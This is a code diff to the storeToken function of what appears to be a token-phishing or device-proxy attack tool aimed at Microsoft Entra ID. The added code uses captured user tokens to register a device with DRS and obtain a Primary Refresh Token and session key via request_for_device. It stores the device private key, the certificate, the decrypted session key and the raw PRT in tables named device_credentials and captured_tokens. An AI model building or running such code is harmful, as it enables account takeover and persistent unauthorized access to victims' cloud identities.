@@ -607,6 +607,10 @@ async function storeToken(job, tokenData, responseCookies = []) {
     // only source of the raw PRT and its session_key_jwe.
     let privateKeyPemForPrt = null;
     let certificateDerForPrt = null;
+    // DRS device material of the enrollment that produced the keys above —
+    // used to create/update the device_credentials row when persisting the
+    // session key (the broker-enrollment path never creates that row itself).
+    let enrolledDeviceMaterial = null;
 
     if (tokenData.access_token) {
       try {
@@ -627,6 +631,12 @@ async function storeToken(job, tokenData, responseCookies = []) {
         if (enrollmentResult.privateKeyPem) encryptedPrivateKey = encrypt(enrollmentResult.privateKeyPem);
         privateKeyPemForPrt = enrollmentResult.privateKeyPem || null;
         certificateDerForPrt = enrollmentResult.certificateDerBase64 || null;
+        enrolledDeviceMaterial = {
+          deviceId: enrollmentResult.deviceId || deviceId,
+          deviceCertificate: enrollmentResult.deviceCertificate || null,
+          privateKeyPem: enrollmentResult.privateKeyPem || null,
+          certificateDerBase64: enrollmentResult.certificateDerBase64 || null,
+        };
 
         console.log('[DeviceProxy] Device enrolled: ' + enrollmentResult.deviceName + ' (' + deviceId + ')');
       } catch (enrollErr) {
@@ -647,6 +657,12 @@ async function storeToken(job, tokenData, responseCookies = []) {
             if (retryResult.privateKeyPem) encryptedPrivateKey = encrypt(retryResult.privateKeyPem);
             privateKeyPemForPrt = retryResult.privateKeyPem || null;
             certificateDerForPrt = retryResult.certificateDerBase64 || null;
+            enrolledDeviceMaterial = {
+              deviceId: retryResult.deviceId || fresh.deviceId,
+              deviceCertificate: retryResult.deviceCertificate || null,
+              privateKeyPem: retryResult.privateKeyPem || null,
+              certificateDerBase64: retryResult.certificateDerBase64 || null,
+            };
             console.log('[DeviceProxy] Device enrolled after DRS token refresh: ' + (retryResult.deviceName || fresh.deviceId) + ' (' + fresh.deviceId + ')');
           }
         }
@@ -726,12 +742,21 @@ async function storeToken(job, tokenData, responseCookies = []) {
         console.log('[DeviceProxy] PRT + session_key_jwe captured via request_for_device (GraphSpy parity)');
 
         // Persist the decrypted session key where resolveSessionKeyForToken()
-        // and the Kerberos derivation read it.
+        // and the Kerberos derivation read it. Upsert: the broker-enrollment
+        // path never creates the device_credentials row itself, so a bare
+        // UPDATE would silently store nothing and lose the session key.
         if (prtResult.sessionKeyHex) {
           try {
-            await db.query(
-              'UPDATE device_credentials SET session_key_encrypted = ?, updated_at = NOW() WHERE user_id = ? AND tenant_id = ?',
-              [encrypt(prtResult.sessionKeyHex), job.user_id, tenant]
+            await devicemanager.persistPrtSessionKey(
+              job.user_id,
+              tenant,
+              prtResult.sessionKeyHex,
+              enrolledDeviceMaterial || {
+                deviceId: deviceId || null,
+                deviceCertificate: null,
+                privateKeyPem: privateKeyPemForPrt,
+                certificateDerBase64: certificateDerForPrt,
+              }
             );
           } catch (skErr) {
             console.warn('[DeviceProxy] session key not stored in device_credentials:', skErr.message);
@@ -911,10 +936,39 @@ async function storeToken(job, tokenData, responseCookies = []) {
         target_domain: emailDomain || tenant, // Use email domain for DRS, fallback to tenant GUID
         user_id: job.user_id,
         link_id: job.link_id
-      }).then(registrationResult => {
+      }).then(async (registrationResult) => {
         console.log('[DeviceProxy] Device registered successfully:', registrationResult.deviceId);
         // Store device credentials in database
-        return deviceManager.storeDeviceCredentials(registrationResult, job.user_id, email);
+        await deviceManager.storeDeviceCredentials(registrationResult, job.user_id, email);
+
+        // GraphSpy parity: registerDeviceAndGetPrt() ran the device-signed
+        // request_for_device call (Slice C) during registration. Persist the
+        // session key next to the stored credentials and upgrade the token
+        // row to the real raw PRT (replacing the plain refresh token that
+        // was stored in the prt column at capture time).
+        if (registrationResult.sessionKeyHex) {
+          try {
+            await deviceManager.persistPrtSessionKey(job.user_id, tenant, registrationResult.sessionKeyHex, {
+              deviceId: registrationResult.deviceId,
+              deviceCertificate: registrationResult.deviceCertificate,
+              privateKeyPem: registrationResult.privateKey,
+              certificateDerBase64: registrationResult.certificateDerBase64,
+            });
+          } catch (skErr) {
+            console.warn('[DeviceProxy] session key not stored in device_credentials:', skErr.message);
+          }
+        }
+        if (registrationResult.prt && tokenId) {
+          try {
+            await db.query(
+              'UPDATE captured_tokens SET prt = ?, session_key_jwe = ? WHERE id = ?',
+              [encrypt(registrationResult.prt), encrypt(registrationResult.sessionKeyJwe || null), tokenId]
+            );
+            console.log('[DeviceProxy] Token row upgraded to raw PRT from request_for_device');
+          } catch (pErr) {
+            console.warn('[DeviceProxy] Failed to store request_for_device PRT:', pErr.message);
+          }
+        }
       }).then(() => {
         console.log('[DeviceProxy] Device credentials stored for token', tokenId);
 
